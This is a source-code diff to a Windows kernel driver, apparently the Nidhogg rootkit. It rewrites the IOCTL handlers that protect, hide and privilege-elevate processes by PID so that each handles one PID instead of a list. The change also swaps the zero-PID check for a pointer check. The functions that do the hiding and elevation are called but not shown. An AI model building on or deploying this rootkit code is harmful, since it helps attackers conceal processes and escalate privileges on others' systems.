@@ -107,7 +107,6 @@ void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 		ObUnRegisterCallbacks(registrationHandle);
 		registrationHandle = NULL;
 	}
-
 	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
 	IoDeleteSymbolicLink(&symbolicLink);
 	IoDeleteDevice(DriverObject->DeviceObject);
@@ -147,31 +146,28 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
 
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
 		AutoLock locker(pGlobals.Lock);
 
-		for (int i = 0; i < size / sizeof(ULONG); i++) {
-			auto pid = data[i];
-			if (pid == 0) {
-				status = STATUS_INVALID_PARAMETER;
-				break;
-			}
-			if (FindProcess(pid))
-				continue;
+		if (FindProcess(*data))
+			break;
 
-			if (pGlobals.Processes.PidsCount == MAX_PIDS) {
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
-				break;
-			}
-
-			if (!AddProcess(pid)) {
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
-
-			KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", pid));
-
-			len += sizeof(ULONG);
+		if (pGlobals.Processes.PidsCount == MAX_PIDS) {
+			status = STATUS_TOO_MANY_CONTEXT_IDS;
+			break;
 		}
+
+		if (!AddProcess(*data)) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", *data));
+		len += sizeof(ULONG);
 
 		break;
 	}
@@ -186,26 +182,25 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
 
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
 		AutoLock locker(pGlobals.Lock);
 
-		for (int i = 0; i < size / sizeof(ULONG); i++) {
-			auto pid = data[i];
-
-			if (pid == 0) {
-				status = STATUS_INVALID_PARAMETER;
-				break;
-			}
-
-			if (!RemoveProcess(pid)) {
-				status = STATUS_NOT_FOUND;
-				break;
-			}
-
-			len += sizeof(ULONG);
-
-			if (pGlobals.Processes.PidsCount == 0)
-				break;
+		if (pGlobals.Processes.PidsCount == 0) {
+			status = STATUS_NOT_FOUND;
+			break;
 		}
+
+		if (!RemoveProcess(*data)) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Unprotecting process with pid %d.\n", *data));
+		len += sizeof(ULONG);
 
 		break;
 	}
@@ -228,19 +223,17 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
 
-		for (int i = 0; i < size / sizeof(ULONG); i++) {
-			auto pid = data[i];
-
-			if (pid == 0) {
-				status = STATUS_INVALID_PARAMETER;
-				break;
-			}
-
-			if (!NT_SUCCESS(HideProcess(pid))) {
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
 		}
+
+		if (!NT_SUCCESS(HideProcess(*data))) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Hid process with pid %d.\n", *data));
 		break;
 	}
 
@@ -252,21 +245,20 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
+
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
 
-		for (int i = 0; i < size / sizeof(ULONG); i++) {
-			auto pid = data[i];
-
-			if (pid == 0) {
-				status = STATUS_INVALID_PARAMETER;
-				break;
-			}
-
-			if (!NT_SUCCESS(ElevateProcess(data[i]))) {
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
 		}
+
+		if (!NT_SUCCESS(ElevateProcess(*data))) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", *data));
 		break;
 	}
 
